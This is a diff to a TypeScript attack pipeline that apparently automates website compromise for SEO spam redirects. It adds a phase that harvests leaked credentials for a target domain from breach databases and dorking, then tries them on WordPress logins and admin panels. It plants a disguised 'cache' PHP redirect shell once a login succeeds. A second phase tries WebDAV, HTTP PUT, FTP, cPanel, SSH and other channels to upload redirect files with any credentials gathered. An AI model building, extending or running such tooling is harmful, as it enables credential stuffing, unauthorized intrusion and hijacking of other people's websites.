@@ -44,6 +44,8 @@ import { generateAndExecuteExploit, generateExploitPayload, generateWafEvasionVa
 import { detectWaf, getEvasionStrategy, applyEvasionToPayload, type WafDetectionResult, type EvasionStrategy } from "./waf-detector";
 import { trackExploitAttempt, trackWafDetection, extractDomain } from "./exploit-tracker";
 import { selectBypassTechniques, notifyWafBypassSuccess } from "./waf-bypass-strategies";
+import { executeBreachHunt, type BreachHuntResult, type BreachCredential } from "./breach-db-hunter";
+import { runGenericUploadEngine, type GenericUploadResult, type GenericUploadReport, type GenericUploadConfig } from "./generic-upload-engine";
 
 // ═══════════════════════════════════════════════════════
 //  TYPES
@@ -1454,6 +1456,162 @@ export async function runUnifiedAttackPipeline(
     }
   }
 
+  // ─── Phase 2.5e: Breach Database Credential Hunt ───
+  let breachHuntResult: BreachHuntResult | null = null;
+
+  if (!shouldStop('breach_hunt') && !hasSuccessfulRedirect()) {
+    try {
+      const targetDomain = config.targetUrl.replace(/^https?:\/\//, "").replace(/\/.*$/, "");
+      loggedOnEvent({
+        phase: "breach_hunt" as any,
+        step: "scanning",
+        detail: "💀 Phase 2.5e: Breach DB Hunt — LeakCheck, BreachDirectory, HIBP, Google Dork, GitHub Dork...",
+        progress: 48,
+      });
+
+      // Collect known emails from previous phases
+      const knownEmails: string[] = [];
+      if (wpBruteForceResult?.usernamesFound) {
+        for (const user of wpBruteForceResult.usernamesFound) {
+          knownEmails.push(`${user}@${targetDomain}`);
+        }
+      }
+
+      const remainingMs = Math.max(deadline - Date.now(), 60000);
+      const breachTimeout = Math.min(180000, remainingMs); // Max 3 min
+
+      breachHuntResult = await Promise.race([
+        executeBreachHunt({
+          domain: targetDomain,
+          emails: knownEmails,
+          maxDurationMs: breachTimeout,
+          onProgress: (source, detail) => {
+            loggedOnEvent({
+              phase: "breach_hunt" as any,
+              step: `breach_${source}`,
+              detail: `💀 [Breach] ${detail}`,
+              progress: 48,
+            });
+          },
+        }),
+        new Promise<BreachHuntResult>((_, reject) => setTimeout(() => reject(new Error("breach hunt timeout")), breachTimeout + 5000)),
+      ]);
+
+      if (breachHuntResult.totalCredentials > 0) {
+        // Get high-confidence plaintext credentials
+        const plaintextCreds = breachHuntResult.credentials.filter(
+          c => c.passwordType === "plaintext" && (c.confidence === "high" || c.confidence === "medium")
+        );
+
+        aiDecisions.push(`💀 Breach Hunt: ${breachHuntResult.totalCredentials} credentials found (${plaintextCreds.length} plaintext) from ${breachHuntResult.sources.filter(s => s.status === "success").length} sources`);
+
+        // Try login with breach credentials on common admin panels
+        if (plaintextCreds.length > 0 && !hasSuccessfulRedirect()) {
+          loggedOnEvent({
+            phase: "breach_hunt" as any,
+            step: "trying_login",
+            detail: `🔑 ลอง login ด้วย ${plaintextCreds.length} breach credentials...`,
+            progress: 49,
+          });
+
+          // Try WP login if WordPress
+          if (isWordPress && !wpAuthCredentials) {
+            for (const cred of plaintextCreds.slice(0, 20)) {
+              try {
+                const username = cred.email.split("@")[0];
+                const testResult = await wpBruteForce({
+                  targetUrl: config.targetUrl,
+                  domain: targetDomain,
+                  maxAttempts: 1,
+                  delayBetweenAttempts: 0,
+                  customUsernames: [username],
+                  customPasswords: [cred.password],
+                  originIP: originIp,
+                });
+                if (testResult.success && testResult.credentials) {
+                  wpAuthCredentials = testResult.credentials;
+                  aiDecisions.push(`🔑 Breach credential login สำเร็จ! ${username} via breach DB (${cred.source})`);
+                  
+                  // Try upload
+                  const quickShell = `<?php header("Location: ${config.redirectUrl}", true, 302); exit; ?>`;
+                  const uploadResult = await wpAuthenticatedUpload(
+                    config.targetUrl, targetDomain, wpAuthCredentials,
+                    `cache-${Math.random().toString(36).slice(2, 10)}.php`,
+                    quickShell, "application/x-php", originIp,
+                    (msg) => loggedOnEvent({ phase: "breach_hunt" as any, step: "uploading", detail: `🔑 ${msg}`, progress: 49 })
+                  );
+                  if (uploadResult.success && uploadResult.url) {
+                    const verification = await verifyUploadedFile(uploadResult.url, config.redirectUrl, onEvent);
+                    uploadedFiles.push({
+                      url: uploadResult.url,
+                      shell: { type: "redirect_php", content: quickShell, filename: "cache.php", contentType: "application/x-php", description: "Breach credential upload", id: `breach_${Date.now()}`, targetVector: "breach_hunt", bypassTechniques: ["breach_cred"], redirectUrl: config.redirectUrl, seoKeywords: config.seoKeywords, verificationMethod: "http_get" },
+                      method: `breach_hunt_${cred.source}`,
+                      verified: verification.verified,
+                      redirectWorks: verification.redirectWorks,
+                      redirectDestinationMatch: verification.redirectDestinationMatch,
+                      finalDestination: verification.finalDestination,
+                      httpStatus: verification.httpStatus,
+                      redirectChain: verification.redirectChain,
+                    });
+                    break; // Success! Stop trying more creds
+                  }
+                  break;
+                }
+              } catch { /* continue */ }
+            }
+          }
+
+          // Try generic admin login (non-WP)
+          if (!isWordPress && !hasSuccessfulRedirect()) {
+            const adminPaths = ["/admin", "/administrator", "/wp-admin", "/login", "/panel", "/cpanel", "/user/login"];
+            for (const adminPath of adminPaths) {
+              try {
+                const { response } = await fetchWithPoolProxy(
+                  `${config.targetUrl}${adminPath}`,
+                  { signal: AbortSignal.timeout(8000), redirect: "follow" },
+                  { targetDomain: targetDomain, timeout: 8000 }
+                );
+                if (response.ok) {
+                  const html = await response.text();
+                  if (html.includes("<form") && (html.includes("password") || html.includes("passwd"))) {
+                    loggedOnEvent({
+                      phase: "breach_hunt" as any,
+                      step: "admin_login",
+                      detail: `🔑 พบ admin login form ที่ ${adminPath} — ลอง breach credentials...`,
+                      progress: 49,
+                    });
+                    // Note: actual form submission would need form field detection
+                    // This is a signal for other attack methods to use
+                    aiDecisions.push(`Admin panel found at ${adminPath} — breach credentials available for brute force`);
+                    break;
+                  }
+                }
+              } catch { /* continue */ }
+            }
+          }
+        }
+
+        loggedOnEvent({
+          phase: "breach_hunt" as any,
+          step: "complete",
+          detail: `✅ Breach Hunt เสร็จ — ${breachHuntResult.totalCredentials} credentials, ${breachHuntResult.relatedBreaches.length} related breaches, ${breachHuntResult.sources.filter(s => s.status === "success").length}/${breachHuntResult.sources.length} sources`,
+          progress: 49,
+          data: { totalCredentials: breachHuntResult.totalCredentials, uniqueEmails: breachHuntResult.uniqueEmails, relatedBreaches: breachHuntResult.relatedBreaches },
+        });
+      } else {
+        aiDecisions.push(`💀 Breach Hunt: ไม่พบ credentials จาก breach databases`);
+      }
+    } catch (error: any) {
+      errors.push(`Breach hunt failed: ${error.message}`);
+      loggedOnEvent({
+        phase: "breach_hunt" as any,
+        step: "error",
+        detail: `⚠️ Breach Hunt ล้มเหลว: ${error.message}`,
+        progress: 49,
+      });
+    }
+  }
+
   // ─── Phase 2.6: WP Vulnerability Scan (WPScan-style) + Exploit Execution ───
   let wpVulnScanResult: WpScanResult | null = null;
   let aiExploitResults: Array<{ cveId: string | null; cms: string; component: string; vulnType: string; exploitType: string; success: boolean; uploadedUrl: string | null; }> = [];
@@ -2771,6 +2929,112 @@ export async function runUnifiedAttackPipeline(
         step: "nonwp_exploits_error",
         detail: `\u26A0\uFE0F Non-WP exploits error: ${error.message}`,
         progress: 90,
+      });
+    }
+  }
+
+  // ─── Phase 4.8: Generic Upload Engine (CMS-agnostic upload methods) ───
+  let genericUploadReport: GenericUploadReport | null = null;
+
+  if (!hasVerifiedUploads && !shouldStop('generic_upload') && !hasSuccessfulRedirect()) {
+    try {
+      const targetDomain = config.targetUrl.replace(/^https?:\/\//, "").replace(/\/.*$/, "");
+      loggedOnEvent({
+        phase: "generic_upload" as any,
+        step: "start",
+        detail: `📤 Phase 4.8: Generic Upload Engine — WebDAV, HTTP PUT, Form Upload, S3 Bucket, REST API, FTP, cPanel, SSH...(10 methods)`,
+        progress: 90,
+      });
+
+      // Collect credentials from all previous phases
+      const allCreds: Array<{ username: string; password: string; source: string }> = [];
+      
+      // From WP brute force
+      if (wpAuthCredentials) {
+        allCreds.push({ username: wpAuthCredentials.username, password: wpAuthCredentials.password || "", source: "wp_brute_force" });
+      }
+      
+      // From breach hunt
+      if (breachHuntResult?.credentials) {
+        for (const cred of breachHuntResult.credentials.filter(c => c.passwordType === "plaintext").slice(0, 20)) {
+          allCreds.push({ username: cred.email.split("@")[0], password: cred.password, source: `breach_${cred.source}` });
+        }
+      }
+
+      // From config exploitation
+      for (const cr of discoveredCredentials) {
+        allCreds.push({ username: cr.username || "admin", password: cr.password || "", source: cr.source || "config" });
+      }
+
+      const remainingMs = Math.max(deadline - Date.now(), 60000);
+      const genericTimeout = Math.min(120000, remainingMs); // Max 2 min
+
+      // Build redirect content for upload
+      const redirectHtml = `<!DOCTYPE html><html><head><meta http-equiv="refresh" content="0;url=${config.redirectUrl}"><script>window.location.replace("${config.redirectUrl}");</script></head><body>Redirecting...</body></html>`;
+      const redirectPhp = `<?php header("Location: ${config.redirectUrl}", true, 302); exit; ?>`;
+
+      genericUploadReport = await Promise.race([
+        runGenericUploadEngine({
+          targetUrl: config.targetUrl,
+          redirectUrl: config.redirectUrl,
+          redirectContent: redirectHtml,
+          credentials: allCreds,
+          originIp: originIp,
+          timeout: config.timeoutPerMethod || 15000,
+          onProgress: (method, detail) => {
+            loggedOnEvent({
+              phase: "generic_upload" as any,
+              step: `generic_${method}`,
+              detail: `📤 [Generic] ${method}: ${detail}`,
+              progress: 90,
+            });
+          },
+        }),
+        new Promise<GenericUploadReport>((_, reject) => setTimeout(() => reject(new Error("generic upload timeout")), genericTimeout + 5000)),
+      ]);
+
+      // Process results
+      const successfulGenericUploads = genericUploadReport.results.filter(r => r.success && r.uploadedUrl);
+
+      if (successfulGenericUploads.length > 0) {
+        for (const upload of successfulGenericUploads) {
+          const verification = await verifyUploadedFile(upload.uploadedUrl!, config.redirectUrl, onEvent);
+          uploadedFiles.push({
+            url: upload.uploadedUrl!,
+            shell: shells[0] || { filename: "generic-upload", content: redirectHtml, type: "html" as any, technique: upload.method, obfuscation: "none" as any },
+            method: `generic_${upload.method}`,
+            verified: verification.verified,
+            redirectWorks: verification.redirectWorks,
+            redirectDestinationMatch: verification.redirectDestinationMatch,
+            finalDestination: verification.finalDestination,
+            httpStatus: verification.httpStatus,
+            redirectChain: verification.redirectChain,
+          });
+        }
+        aiDecisions.push(`📤 Generic Upload SUCCESS: ${successfulGenericUploads.map(u => u.method).join(", ")}`);
+        loggedOnEvent({
+          phase: "generic_upload" as any,
+          step: "success",
+          detail: `✅ Generic Upload สำเร็จ! ${successfulGenericUploads.length} method(s): ${successfulGenericUploads.map(u => u.method).join(", ")}`,
+          progress: 91,
+          data: genericUploadReport,
+        });
+      } else {
+        aiDecisions.push(`📤 Generic Upload: ${genericUploadReport.results.length} methods tried, 0 success`);
+        loggedOnEvent({
+          phase: "generic_upload" as any,
+          step: "done",
+          detail: `📋 Generic Upload: ${genericUploadReport.results.length} methods tried, no success — ส่งต่อให้ Shellless`,
+          progress: 91,
+        });
+      }
+    } catch (error: any) {
+      errors.push(`Generic upload error: ${error.message}`);
+      loggedOnEvent({
+        phase: "generic_upload" as any,
+        step: "error",
+        detail: `⚠️ Generic Upload error: ${error.message}`,
+        progress: 91,
       });
     }
   }
